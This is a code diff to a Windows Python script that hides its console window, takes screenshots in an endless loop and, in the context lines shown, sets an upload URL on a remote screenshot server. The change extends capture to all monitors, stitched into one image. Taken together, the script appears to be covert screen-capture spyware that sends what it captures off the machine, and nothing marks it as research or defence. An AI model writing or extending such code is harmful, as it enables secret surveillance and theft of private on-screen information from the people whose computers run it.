@@ -1,10 +1,13 @@
 import os
 import datetime
 import time
-from PIL import ImageGrab
+from PIL import ImageGrab, Image
 import win32gui
 import socket
 import requests
+import numpy as np
+import win32api
+import win32con
 
 # Hiden console
 win = win32gui.GetForegroundWindow()
@@ -37,9 +40,28 @@ while True:
     # Create path file
     screenshot_filename = os.path.join(save_path, filename )
 
-    # Screenshot and save
-    screenshot = ImageGrab.grab()
-    screenshot.save(screenshot_filename)
+    # GET NUM SCREEN
+    num_monitors = win32api.GetSystemMetrics(win32con.SM_CMONITORS)
+
+    screenshots = []
+
+    for i in range(num_monitors):
+        left, top, right, bottom = win32api.GetMonitorInfo(win32api.EnumDisplayMonitors(None, None)[i][0])['Monitor']
+        width = right - left
+        height = bottom - top
+        
+        screenshot = ImageGrab.grab(bbox=(left, top, right, bottom))
+        
+        screenshots.append(screenshot)
+
+    # Ghép các ảnh lại thành một ảnh toàn màn hình
+    all_screens = Image.new('RGB', (sum([s.width for s in screenshots]), max([s.height for s in screenshots])))
+    x_offset = 0
+    for screen in screenshots:
+        all_screens.paste(screen, (x_offset,0))
+        x_offset += screen.width
+
+    all_screens.save(screenshot_filename)
 
     url = 'http://screenshot-server.local:8080/upload'
 
